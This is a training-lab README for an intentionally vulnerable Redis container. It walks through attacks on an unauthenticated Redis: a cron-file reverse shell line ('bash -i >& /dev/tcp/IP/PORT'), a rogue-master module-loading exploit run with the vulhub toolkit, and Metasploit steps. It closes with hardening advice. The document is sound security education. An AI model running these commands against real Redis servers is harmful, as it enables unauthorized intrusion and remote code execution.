# Redis Unauthorized Access & Rogue Dynamic Module RCE (Port 6379)

## Overview

Redis (Remote Dictionary Server) is an in-memory key-value data structure store used as a database, cache, message broker, and streaming engine. By design, Redis was architected to be accessed exclusively by trusted clients inside private, isolated networks and originally defaulted to running without passwords or authentication.

When a Redis service is inadvertently exposed to external networks without password authentication (`requirepass` disabled) and without protected mode, it becomes vulnerable to **Unauthorized Access (CWE-306)**. Beyond dumping and tampering with sensitive session caches, attackers can leverage built-in database dump primitives (`CONFIG SET dir` and `CONFIG SET dbfilename`) or the **Rogue Dynamic Module Injection technique (Redis >= 4.x)** to achieve unauthenticated Remote Code Execution.

- **Primary Interface**: TCP Port `6379` (`redis-cli -h localhost -p 6379`)
- **Docker Shortcut**: `./lab start redis-unauth`
- **Container Name**: `cyberlab_04_redis_unauth`
- **RAM Footprint**: ~45 MB (C-based in-memory engine)

---

## Architecture & Attack Vectors

```
+-------------------------------------------------------------+
|              Attacker Machine (redis-cli / Python)          |
+-------------------------------------------------------------+
                               |
                        TCP Port 6379
                               v
+-------------------------------------------------------------+
|               Redis Container (vulhub/redis:4.0.14)         |
|                                                             |
|  Vector A: Memory Persistence File Drop                     |
|    - CONFIG SET dir /var/spool/cron/crontabs/               |
|    - CONFIG SET dbfilename root                             |
|    - SET x "\n* * * * * bash -i >& /dev/tcp/IP/PORT 0>&1\n" |
|    - SAVE                                                   |
|                                                             |
|  Vector B: Rogue Dynamic Module Loading (MODULE LOAD)       |
|    - Attacker acts as Master, Redis as Slave (SLAVEOF)      |
|    - Transfers compiled module.so via full sync             |
|    - MODULE LOAD <path>/module.so                           |
|    - Executes system commands via new Redis commands        |
+-------------------------------------------------------------+
```

---

## Exploitation Walkthroughs

### Vector 1: Reconnaissance & In-Memory Data Exfiltration

Connect to the unauthenticated Redis daemon using `redis-cli` or `nc`:

```bash
# Verify unauthenticated connection
redis-cli -h 127.0.0.1 -p 6379 ping
# Response: PONG

# Inspect server metadata and operating system context
redis-cli -h 127.0.0.1 -p 6379 info

# Enumerate all database keys
redis-cli -h 127.0.0.1 -p 6379 keys "*"
```

### Vector 2: Rogue Dynamic Module Remote Code Execution

Starting in Redis 4.0, Redis introduced the Module API, allowing developers to load custom `.so` C libraries. If an attacker simulates a Redis Master using a rogue server, they can sync a compiled shared library to the victim and execute commands directly:

```bash
# Clone the open-source Redis rogue server exploit toolkit
git clone https://github.com/vulhub/redis-rogue-getshell.git /tmp/redis-rogue

# Execute rogue module loading against the container
python3 /tmp/redis-rogue/redis-master.py -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 21000 -f /tmp/redis-rogue/exp.so -c "id; uname -a"
```

The exploit spins up a temporary fake master on port 21000, instructs the victim to replicate from it, uploads `exp.so`, and loads the module to execute the payload.

### Vector 3: Metasploit Rogue Module Exploit

```bash
msfconsole -q
use exploit/linux/redis/redis_replication_cmd_exec
set RHOSTS 127.0.0.1
set RPORT 6379
set LHOST 172.17.0.1
exploit
```

---

## Defensive Remediation & Hardening

1. **Mandatory Password Authentication**:
   Enforce strong authentication inside `/etc/redis/redis.conf`:
   ```text
   requirepass SuperSecretComplexPassword123!
   ```
2. **Bind Exclusively to Localhost or Private Interface**:
   ```text
   bind 127.0.0.1
   protected-mode yes
   ```
3. **Disable or Rename Dangerous Primitives**:
   Rename or completely disable sensitive administrative commands that permit file writes or module loading:
   ```text
   rename-command FLUSHALL ""
   rename-command CONFIG ""
   rename-command MODULE ""
   rename-command SLAVEOF ""
   ```

---

## Video Walkthroughs & Technical References

- [Redis NoSQL Database Exploit Using SSH | CTF Walkthrough](https://www.youtube.com/watch?v=TxUlDttIWY8)
- [Vulhub Redis Unauthorized RCE Advisory](https://vulhub.org/#/environments/redis/unauthorized-rce/)
- [Redis Security Documentation](https://redis.io/docs/management/security/)
